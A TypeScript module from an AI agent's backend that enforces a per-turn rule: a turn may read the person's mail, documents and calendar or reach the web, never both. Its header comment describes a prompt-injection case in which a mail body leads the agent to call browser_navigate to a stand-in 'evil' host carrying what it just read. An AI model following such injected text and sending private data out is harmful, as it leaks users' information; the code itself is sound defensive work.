/**
 * What a turn has already touched, and what that costs it.
 *
 * The chair holds both halves of an exfiltration: it reads the mail, the
 * documents and the calendar, and it drives a browser that can open any URL.
 * A mail body that talks it into `browser_navigate("https://evil/?q=<what it
 * just read>")` needs no click and leaves no trace on this bench. The written
 * safety model said "agents that read stranger text cannot fetch, run or send",
 * and the browser arrived after it.
 *
 * Rather than taking the browser away — which is a capability the chair is
 * genuinely useful for — a turn may hold either half, not both. Reading
 * something of the person's closes the browser and bars it for the rest of
 * that turn, whichever order the two came in: after the read there is nothing
 * to carry anything out with, and a turn that browsed first is in the same
 * place the moment it reads.
 *
 * Per turn, because that is the unit a prompt injection acts within: the next
 * turn starts clean, and the person browsing the pane themselves is not a turn
 * at all.
 */

/** Turn ids that have read something private. Bounded: turn ids are per CLI run. */
const readPrivate = new Set<string>();

/**
 * Turn ids that have reached the web: a page fetched, a search, a browser
 * opened.
 *
 * The browser can be taken away again, because it is a process this backend
 * owns. WebFetch and WebSearch cannot — they are on the CLI's command line, and
 * that is fixed when the turn is spawned — so for those the rule has to run the
 * other way round: a turn that has already fetched something does not get to
 * read anything of the person's afterwards. Either way a turn holds one half.
 */
const usedWeb = new Set<string>();

/** A few turns' worth of each. Turn ids are per CLI run, so this is generous. */
const MAX_REMEMBERED = 64;

function remember(set: Set<string>, turn: string): void {
  set.add(turn);
  // Oldest first, which is insertion order for a Set.
  for (const old of set) {
    if (set.size <= MAX_REMEMBERED) break;
    set.delete(old);
  }
}

export function barBrowsing(turn: string): void {
  remember(readPrivate, turn);
}

export function browsingBarred(turn: string | undefined): boolean {
  return turn !== undefined && readPrivate.has(turn);
}

/** The built-in web tools, which a turn cannot be relieved of once it has them. */
const WEB_TOOLS = new Set(["WebFetch", "WebSearch"]);

/** Called as the stream reports each tool the turn asks for. */
export function noteTool(turn: string, name: string): void {
  if (WEB_TOOLS.has(name) || name.startsWith("mcp__browser")) remember(usedWeb, turn);
}

export function reachedTheWeb(turn: string | undefined): boolean {
  return turn !== undefined && usedWeb.has(turn);
}

/** Test seam: module state, and a test file is one process. */
export function resetTaint(): void {
  readPrivate.clear();
  usedWeb.clear();
}
